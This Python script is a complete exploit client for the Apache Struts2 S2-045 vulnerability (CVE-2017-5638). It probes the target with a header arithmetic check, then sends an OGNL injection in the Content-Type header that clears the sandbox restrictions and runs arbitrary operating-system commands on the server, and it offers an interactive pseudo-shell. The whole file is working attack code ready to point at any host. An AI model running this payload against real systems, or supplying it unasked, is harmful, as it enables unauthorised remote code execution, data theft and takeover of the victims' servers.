#!/usr/bin/env python3
"""
S2-045 (CVE-2017-5638) - Apache Struts2 Remote Code Execution
Client script to exploit the OGNL injection via Content-Type header.

Target: Struts 2.3.5 - 2.3.31, Struts 2.5 - 2.5.10
Port:   8080
"""

import argparse
import sys
import requests

requests.packages.urllib3.disable_warnings()


def check_target(target):
    """Check if the target is accessible."""
    try:
        r = requests.get(f"{target}/", timeout=10, verify=False)
        print(f"[+] Target accessible (HTTP {r.status_code})")
        return True
    except requests.exceptions.ConnectionError:
        print(f"[-] Could not connect to {target}")
        return False


def check_vulnerability(target):
    """Check if the target is vulnerable by performing a simple calculation."""
    print("\n[*] Checking for S2-045 vulnerability...")
    ognl = (
        "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
        ".addHeader('X-Vuln-Test',233*233)}.multipart/form-data"
    )
    headers = {
        "Content-Type": ognl,
        "User-Agent": "Mozilla/5.0"
    }

    try:
        r = requests.post(f"{target}/", headers=headers, data="",
                         timeout=10, verify=False)
        vuln_header = r.headers.get("X-Vuln-Test", "")
        if vuln_header == "54289":
            print(f"[+] VULNERABLE! (233*233 = {vuln_header})")
            return True
        else:
            print("[-] Target does not appear vulnerable.")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def exploit(target, command):
    """Execute a command via S2-045 OGNL injection."""
    ognl = (
        "%{(#_='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        "(#cmd='CMD')."
        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true))."
        "(#process=#p.start())."
        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        "(#ros.flush())}"
    ).replace("CMD", command)

    headers = {
        "Content-Type": ognl,
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Connection": "close",
    }

    try:
        payload_body = ""
        r = requests.post(
            f"{target}/",
            headers={**headers, "Content-Length": "0"},
            data=payload_body,
            timeout=15,
            verify=False,
        )
        if r.status_code == 200 and r.text.strip():
            print("[+] Command executed successfully!")
            print(f"[+] Output:\n{r.text.strip()}")
            return r.text
        else:
            print(f"[*] Request sent (HTTP {r.status_code})")
            if r.text.strip():
                print(f"[*] Response: {r.text[:500]}")
            return r.text
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed to {target}")
        return None


def interactive_shell(target):
    """Interactive pseudo-shell."""
    print("\n[*] Interactive shell mode. Type 'exit' to quit.")
    while True:
        try:
            cmd = input("shell> ").strip()
            if cmd.lower() == "exit":
                break
            if not cmd:
                continue
            exploit(target, cmd)
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break


def main():
    parser = argparse.ArgumentParser(
        description="S2-045 (CVE-2017-5638): Apache Struts2 RCE Exploit"
    )
    parser.add_argument("target", help="Target URL (e.g., http://192.168.1.100:8080)")
    parser.add_argument("--cmd", default="id", help="Command to execute (default: id)")
    parser.add_argument("--shell", action="store_true", help="Start interactive shell")
    parser.add_argument("--check-only", action="store_true",
                        help="Only check vulnerability, don't exploit")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    print(f"[*] Target: {target}")

    if not check_target(target):
        sys.exit(1)

    if args.check_only:
        check_vulnerability(target)
    elif args.shell:
        if check_vulnerability(target):
            interactive_shell(target)
    else:
        exploit(target, args.cmd)


if __name__ == "__main__":
    main()
